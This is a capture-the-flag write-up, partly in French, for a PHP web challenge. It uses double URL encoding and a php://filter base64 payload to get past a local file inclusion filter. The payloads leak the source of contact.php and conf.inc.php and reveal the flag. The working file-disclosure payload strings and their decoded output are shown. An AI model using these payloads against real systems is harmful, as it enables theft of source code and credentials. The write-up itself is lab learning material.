For example, “../” (dot-dot-slash) characters represent %2E%2E%2f in hexadecimal representation. When the % symbol is encoded again, its representation in hexadecimal code is %25. The result from the double encoding process ”../”(dot-dot-slash) would be %252E%252E%252F:

    The hexadecimal encoding of “../” represents "%2E%2E%2f"

    Then encoding the “%” represents "%25"

    Double encoding of “../” represents "%252E%252E%252F"

    Double encoding chart:

    . = %252E
    / = %252F
    < = %253C
    > = %253E
    : = %253A

more: https://ascii.cl/htmlcodes.htm

1. le click sur le lien: "/index.php?page=cv" 
2. je change la querie en "?page=%252E%252E%252F"
→ j'obtiens ce message d'erreur
````
Warning: include(): open_basedir restriction in effect. File(../.inc.php) is not within the allowed path(s): (/challenge/web-serveur/ch45:/tmp) in /challenge/web-serveur/ch45/index.php on line 7

Warning: include(../.inc.php): failed to open stream: Operation not permitted in /challenge/web-serveur/ch45/index.php on line 7

Warning: include(): Failed opening '../.inc.php' for inclusion (include_path='.:/usr/share/php') in /challenge/web-serveur/ch45/index.php on line 7
````

3. je change donc la querie en 

/index.php?page=php://filter/convert.base64-encode/resource=contact

→ je passe la querrie en double encodage

/index.php?page=php%253A%252F%252Ffilter%252Fconvert%252Ebase64-encode%252Fresource=contact

4. j'obtiens le code suivant en base64
```
PD9waHAgaW5jbHVkZSgiY29uZi5pbmMucGhwIik7ID8+CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KICA8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDx0aXRsZT5KLiBTbWl0aCAtIENvbnRhY3Q8L3RpdGxlPgogIDwvaGVhZD4KICA8Ym9keT4KICAgIDw/PSAkY29uZlsnZ2xvYmFsX3N0eWxlJ10gPz4KICAgIDxuYXY+CiAgICAgIDxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWhvbWUiPkhvbWU8L2E+CiAgICAgIDxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWN2Ij5DVjwvYT4KICAgICAgPGEgaHJlZj0iaW5kZXgucGhwP3BhZ2U9Y29udGFjdCIgY2xhc3M9ImFjdGl2ZSI+Q29udGFjdDwvYT4KICAgIDwvbmF2PgogICAgPGRpdiBpZD0ibWFpbiI+CiAgICAgIDxoMj5Db250YWN0PC9oMj4KICAgICAgPHA+SWYgeW91IGdvdCB0byB0YWxrIHRvIG1lLCBkb24ndCBoZXNpdGF0ZSB0byBzZW5kIG1lIGFuIGVtYWlsIDxhIGhyZWY9Im1haWx0bzo8Pz0gJGNvbmZbJ2NvbnRhY3QnXVsnbWFpbCddID8+Ij5oZXJlPC9hPi48L3A+CiAgICAgIDxwPllvdSBjYW4gYWxzbyBwaG9uZSBtZSBvbiB0aGlzIG51bWJlciA6IDw/PSAkY29uZlsnY29udGFjdCddWydwaG9uZSddID8+PC9wPgogICAgPC9kaXY+CiAgPC9ib2R5Pgo8L2h0bWw+Cg==
```
→ que je décode avec https://www.base64decode.org/
→ pour obtenir
````
<?php include("conf.inc.php"); ?>
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>J. Smith - Contact</title>
  </head>
  <body>
    <?= $conf['global_style'] ?>
    <nav>
      <a href="index.php?page=home">Home</a>
      <a href="index.php?page=cv">CV</a>
      <a href="index.php?page=contact" class="active">Contact</a>
    </nav>
    <div id="main">
      <h2>Contact</h2>
      <p>If you got to talk to me, don't hesitate to send me an email <a href="mailto:<?= $conf['contact']['mail'] ?>">here</a>.</p>
      <p>You can also phone me on this number : <?= $conf['contact']['phone'] ?></p>
    </div>
  </body>
</html>
````
→ le fichier de config est donc 'conf.inc.php'

5. j'accède au fichier 'conf.inc.php'
/index.php?page=php%253A%252F%252Ffilter%252Fconvert%252Ebase64-encode%252Fresource=conf
→ j'obtiens le code en base 64
```
PD9waHAKICAkY29uZiA9IFsKICAgICJmbGFnIiAgICAgICAgPT4gIlRoMXNJc1RoM0ZsNGchIiwKICAgICJob21lIiAgICAgICAgPT4gJzxoMj5XZWxjb21lPC9oMj4KICAgIDxkaXY+V2VsY29tZSBvbiBteSBwZXJzb25hbCB3ZWJzaXRlICE8L2Rpdj4nLAogICAgImN2IiAgICAgICAgICA9PiBbCiAgICAgICJnZW5kZXIiICAgICAgPT4gdHJ1ZSwKICAgICAgImJpcnRoIiAgICAgICA9PiA0NDE3NTk2MDAsCiAgICAgICJqb2JzIiAgICAgICAgPT4gWwogICAgICAgIFsKICAgICAgICAgICJ0aXRsZSIgICAgID0+ICJDb2ZmZWUgZGV2ZWxvcGVyIEBNZWdhdXBsb2FkIiwKICAgICAgICAgICJkYXRlIiAgICAgID0+ICIwMS8yMDEwIgogICAgICAgIF0sCiAgICAgICAgWwogICAgICAgICAgInRpdGxlIiAgICAgPT4gIkJlZCB0ZXN0ZXIgQFlvdXJNb20ncyIsCiAgICAgICAgICAiZGF0ZSIgICAgICA9PiAiMDMvMjAxMSIKICAgICAgICBdLAogICAgICAgIFsKICAgICAgICAgICJ0aXRsZSIgICAgID0+ICJCZWVyIGRyaW5rZXIgQE5lYXJlc3RCYXIiLAogICAgICAgICAgImRhdGUiICAgICAgPT4gIjEwLzIwMTQiCiAgICAgICAgXQogICAgICBdCiAgICBdLAogICAgImNvbnRhY3QiICAgICAgID0+IFsKICAgICAgImZpcnN0bmFtZSIgICAgID0+ICJKb2huIiwKICAgICAgImxhc3RuYW1lIiAgICAgID0+ICJTbWl0aCIsCiAgICAgICJwaG9uZSIgICAgICAgICA9PiAiMDEgMzMgNzEgMDAgMDEiLAogICAgICAibWFpbCIgICAgICAgICAgPT4gImpvaG4uc21pdGhAdGhlZ2FtZS5jb20iCiAgICBdLAogICAgImdsb2JhbF9zdHlsZSIgID0+ICc8c3R5bGUgbWVkaWE9InNjcmVlbiI+CiAgICAgIGJvZHl7CiAgICAgICAgYmFja2dyb3VuZDogcmdiKDIzMSwgMjMxLCAyMzEpOwogICAgICAgIGZvbnQtZmFtaWx5OiBUYWhvbWEsVmVyZGFuYSxTZWdvZSxzYW5zLXNlcmlmOwogICAgICAgIGZvbnQtc2l6ZTogMTRweDsKICAgICAgfQogICAgICBkaXYjbWFpbnsKICAgICAgICBwYWRkaW5nOiAyMHB4IDEwcHg7CiAgICAgIH0KICAgICAgbmF2ewogICAgICAgIGJvcmRlcjogMXB4IHNvbGlkIHJnYigxMDEsIDEwMSwgMTAxKTsKICAgICAgICBmb250LXNpemU6IDA7CiAgICAgIH0KICAgICAgbmF2IGF7CiAgICAgICAgZm9udC1zaXplOiAxNHB4OwogICAgICAgIHBhZGRpbmc6IDVweCAxMHB4OwogICAgICAgIGJveC1zaXppbmc6IGJvcmRlci1ib3g7CiAgICAgICAgZGlzcGxheTogaW5saW5lLWJsb2NrOwogICAgICAgIHRleHQtZGVjb3JhdGlvbjogbm9uZTsKICAgICAgICBjb2xvcjogIzU1NTsKICAgICAgfQogICAgICBuYXYgYS5hY3RpdmV7CiAgICAgICAgY29sb3I6ICNmZmY7CiAgICAgICAgYmFja2dyb3VuZDogcmdiKDExOSwgMTM4LCAxNDQpOwogICAgICB9CiAgICAgIG5hdiBhOmhvdmVyewogICAgICAgIGNvbG9yOiAjZmZmOwogICAgICAgIGJhY2tncm91bmQ6IHJnYigxMTksIDEzOCwgMTQ0KTsKICAgICAgfQogICAgICBoMnsKICAgICAgICBtYXJnaW4tdG9wOjA7CiAgICAgIH0KICAgICAgPC9zdHlsZT4nCiAgXTsK
```

→ que je décode de la même façon
````
<?php
  $conf = [
    "flag"        => "Th1sIsTh3Fl4g!",
    "home"        => '<h2>Welcome</h2>
    <div>Welcome on my personal website !</div>',
    "cv"          => [
      "gender"      => true,
      "birth"       => 441759600,
      "jobs"        => [
        [
          "title"     => "Coffee developer @Megaupload",
          "date"      => "01/2010"
        ],
        [
          "title"     => "Bed tester @YourMom's",
          "date"      => "03/2011"
        ],
        [
          "title"     => "Beer drinker @NearestBar",
          "date"      => "10/2014"
        ]
      ]
    ],
    "contact"       => [
      "firstname"     => "John",
      "lastname"      => "Smith",
      "phone"         => "01 33 71 00 01",
      "mail"          => "john.smith@thegame.com"
    ],
    "global_style"  => '<style media="screen">
      body{
        background: rgb(231, 231, 231);
        font-family: Tahoma,Verdana,Segoe,sans-serif;
        font-size: 14px;
      }
      div#main{
        padding: 20px 10px;
      }
      nav{
        border: 1px solid rgb(101, 101, 101);
        font-size: 0;
      }
      nav a{
        font-size: 14px;
        padding: 5px 10px;
        box-sizing: border-box;
        display: inline-block;
        text-decoration: none;
        color: #555;
      }
      nav a.active{
        color: #fff;
        background: rgb(119, 138, 144);
      }
      nav a:hover{
        color: #fff;
        background: rgb(119, 138, 144);
      }
      h2{
        margin-top:0;
      }
      </style>'
  ];

````

6. je flag à $conf → flag